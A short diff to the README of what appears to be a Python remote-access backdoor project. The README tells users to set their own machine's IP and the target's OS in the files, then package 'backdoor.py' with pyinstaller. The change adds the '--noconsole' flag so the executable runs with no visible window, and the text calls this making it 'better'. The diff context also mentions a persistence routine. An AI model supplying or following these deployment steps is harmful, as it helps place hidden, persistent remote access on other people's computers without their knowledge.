@@ -32,7 +32,7 @@ def persistence(self):
 Once the files have been edited for your machine's IP and target's OS, it can be converted to a executable using pyinstaller, or can be used as it is
 ```
 pip3 install pyinstaller
-pyinstaller --onefile backdoor.py
+pyinstaller --onefile --noconsole backdoor.py
 # add the no console argument to make it better
 ```
 The executable will be found in the dist folder
